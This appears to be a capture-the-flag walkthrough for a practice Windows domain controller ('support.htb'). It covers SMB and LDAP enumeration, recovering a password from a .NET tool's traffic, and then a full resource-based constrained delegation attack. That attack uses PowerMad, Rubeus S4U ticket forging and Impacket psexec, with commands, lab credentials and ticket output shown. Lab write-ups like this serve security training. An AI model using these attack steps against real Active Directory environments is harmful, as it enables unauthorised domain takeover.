# Recon
```
sudo nmap -p- --min-rate 10000 10.10.11.174            
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 18:51 EEST
Nmap scan report for 10.10.11.174
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9389/tcp open  adws

Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
```
- with version
```
 nmap -sC -sV 10.10.11.174 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 18:53 EEST
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.34% done; ETC: 18:54 (0:00:00 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.32% done; ETC: 18:54 (0:00:00 remaining)
Nmap scan report for 10.10.11.174
Host is up (0.12s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-30 14:53:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m52s
| smb2-time: 
|   date: 2023-07-30T14:54:08
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.44 seconds
```
- we see smb so enumrate using crackmapexec
```
 crackmapexec smb 10.10.11.174 --users --shares    
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
SMB         10.10.11.174    445    DC               [-] Error enumerating domain users using dc ip 10.10.11.174: NTLM needs domain\username and a password
SMB         10.10.11.174    445    DC               [*] Trying with SAMRPC protocol
```
- cant enumrate shares or users
- try smbclient and we got shares
```
 smbclient -L 10.10.11.174                  
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- From the available shares, support-tools seems interesting as it is not a default share
```
 smbclient \\\\10.10.11.174\\support-tools

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 969193 blocks available
smb: \> 
```
- we got into the shares and found intersting file UserInfo.exe.zip
- we get this file and unzip it
- archive contains quite a few DLL's as well as an executable file called UserInfo.exe
- file type of UserInfo.exe shows that it is a .Net executable
- we are using a Linux system
- we have two ways to proceed. Decompiling the executable to see what it does or using Wine to attempt to run it
- In order to decompile the .Net executable we can use Avalonia ILspy, which is a cross-platform version of ILSpy that works on Linux
- we run ilspy now load the UserInfo executable in order to decompile it
- ILSpy will take care the decompilation and we will be able to view the source code
- quickly notice a function called LdapQuery as well as two other functions called FindUser and GetUser
- The code indicates that the binary is used to connect to a remote LDAP server and attempt to fetch user information.
- Let's add support.htb to our hosts file
- password to authenticate with the LDAP server is fetched from the Protected.getPassword() function
- the password seems to be encrypted using XOR. The decryption process is :
  - The enc_password string is Base64 decoded and placed into a byte array
  - A second byte array called array2 is created with the same value as array
  - A loop is initialised, which loops through each character in array and XORs it with one letter of the key and then with the byte 0xDFu (223)
  - Finally the decrypted key is returned.
- didnt understand where to go from there so i used another method to get the password
- Wine , an application that can run Windows applications on Linux systems
- Executing the binary with Wine shows its command line usage
- attempt to use the find flag to determine its functionality
- The program states we also need a -first or -last flag. Let's add it
```
wine UserInfo.exe -v find -first "test"
[*] LDAP query to use: (givenName=test)
[-] Exception: No Such Object
```
- The binary seems to have successfully connected to the remote LDAP server and prints out the LDAP query
that is being run
- The binary seems to have successfully connected to the remote LDAP server and prints out the LDAP query that is being run
- can also attempt to inject the LDAP query to list all objects, however, this also fails
- The binary is actually LDAP query injectable, however, this only works through Windows
- We know the binary is connecting to the remote LDAP server on the box and somehow authenticating
- let's fire up WireShark and capture the network traffic to see if we can grab the username and password that are used for the authentication
- run the binary again with wine
- The LDAP authentication is captured in WireShark and clicking on the bindRequest packet shows the username and password combination in use 
- we can navigate to Lightweight Directory Access Protocol , open protocolOp and then bindRequest to identify the username support\ldap
- we can select authentication to view the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
- now go to Apache Directory Studio
- let's add a connection to the LDAP server by clicking the LDAP button on the top left of the screen
- right click anywhere inside the Connections window and select New Connection
- ldap@support.htb as the Bind DN and paste in the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
- Back in the home screen of the Apache Directory Studio utility, we can see the Support
- Double clicking it will allow us to connect to the remote LDAP server and list all of the LDAP objects
- notice an object with a Common Name of users
- we find a non default tag called info with a value of Ironside47pleasure40Watchful in the support user
-  we can also see that this user is a member of the Remote Management Users group
-  which allows them to connect over WinRM. To this end lets attempt to use evil-winrm to connect remotely to the support user with the identified password
- and we got ashell and the user flag
# Privilege Escalation
- Nmap output already revealed to us that the machine belongs to a Domain
```
*Evil-WinRM* PS C:\Users\support\Desktop> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```
- the machine is the Domain Controller ( dc.support.htb ) for the support.htb domain. Let's add this hostname to our hosts file
- check if the current user is a member of any interesting groups
```
*Evil-WinRM* PS C:\Users\support\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\support\Desktop> 
```
- The support user seems to be a member of a non default group called Shared Support Accounts as well as the Authenticated Users group
- now use bloodhound o identify potential attack paths is this domain that can help us increase our privileges
- we will have to collect data from the remote machine before we proceed
- We will use the SharpHound.exe binary to collect Active Directory data
- upload sharphounad and run it and doanload the data collected and open it using bloodhound
- Once the data has been loaded, we can search for SUPPORT@SUPPORT.HTB
- click on the user object and select Mark User as Owned to specify that we already have access to the system as this user
- We can see that the Group Delegated Object Control section shows a value of 1 we press it to see more output 
- the output shows that the Shared Support Accounts group has GenericAll privileges on the Domain Controller
- the support user is a member of this group, they as well have all privileges on the DC
- Right clicking on the line called GenericAll and selecting Help provides more information about this privilege as well as how to exploit it
- bloodhound mentions that we can do resource-based-constrained-delegation attack
  - through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain
  - call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it.
  - by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01
  - with the ability to impersonate a highly privileged user on the Domain, such as the Administrator
  - After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain
 - the attack relies on three prerequisites
   - We need a shell or code execution as a domain user that belongs to the Authenticated Users group
   - The ms-ds-machineaccountquota attribute needs to be higher than 0
   - Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller
  -  we know that the support user is indeed a member of the Authenticated Users group as well as the Shared Support Accounts group
  -  Shared Support Accounts group has GenericAll privileges over the Domain Controller
  -  checking  the value of the ms-ds-machineaccountquota attribute
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota


DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
```
- this attribute is set to 10, which means each authenticateddomain user can add up to 10 computers to the domain
- verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we need the PowerView module for PowerShell
- upload it like before and impor it like this
  ```
  . ./PowerView.ps1
  ```
- use the Get-DomainComputer commandlet to query the required information
- value is empty, which means we are ready to perform the RBCD attack, but first let's upload the toolsthat are required. We will need PowerMad and Rubeus, which we can upload using Evil-WinRM
- powermad can be imported like powerview above
- Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount to achieve this
```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString
'Password123' -AsPlainText -Force)
```
- verify this new machine with the following command
```
Get-ADComputer -identity FAKE-COMP01
```
- configure Resource-Based Constrained Delegation through one of two ways
  - set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module
  - which will in turn configure the msdsallowedtoactonbehalfofotheridentity attribute on its own
  - or we can use the PowerView module to directly set the msds-allowedtoactonbehalfofotheridentity attribut
- Let's use the Set-ADComputer command to configure RBCD
```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```
- use the Get-ADComputer command to verify the prevoius commadn has worked
```
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```
- the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the command worked
- verify the value of the msds-allowedtoactonbehalfofotheridentity
```
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```
- the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on
- grab the desired value and dump it to a variable called RawBytes
```
$RawBytes = Get-DomainComputer DC -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
```
- convert these bytes to a Raw Security Descriptor object
```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```
- we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control List that specifies the machines that can act on behalf of the DC
```
$Descriptor
$Descriptor.DiscretionaryAcl
```
- we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01
- the AceType is set to AccessAllowed .
- time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator
- we will need the hash of the password that was used to create the computer object
```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```
- grab the value called rc4_hmac . Next, we can generate Kerberos tickets for the Administrator
```
*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      MA4bDEZBS0UtQ09NUDAxJA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```
- now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator
- copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64
- Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```
-  convert this ticket to a format that Impacket can use. This can be achieved with Impackets' TicketConverter.py
-  To acquire a shell we can use Impackets' psexec.py 
```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

